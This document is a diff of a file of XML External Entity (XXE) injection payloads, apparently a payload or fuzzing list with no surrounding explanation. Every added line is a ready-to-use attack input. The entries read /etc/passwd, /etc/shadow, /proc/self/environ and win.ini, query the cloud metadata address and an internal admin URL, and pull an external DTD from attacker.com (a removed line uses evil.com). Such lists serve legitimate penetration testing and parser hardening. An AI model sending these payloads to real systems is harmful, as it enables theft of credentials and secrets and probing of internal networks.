@@ -1,3 +1,7 @@
-<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
-<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/evil.dtd"> %xxe;]>
-<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/shadow">]><root>&test;</root>
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><x>&xxe;</x>
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><x>&xxe;</x>
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><x>&xxe;</x>
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY % ext SYSTEM "http://attacker.com/evil.dtd"> %ext;]><x/>
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///proc/self/environ">]><x>&xxe;</x>
+<?xml version="1.0"?><!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///windows/win.ini">]><x>&xxe;</x>
+<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://internal-host:8080/admin">]><foo>&xxe;</foo>
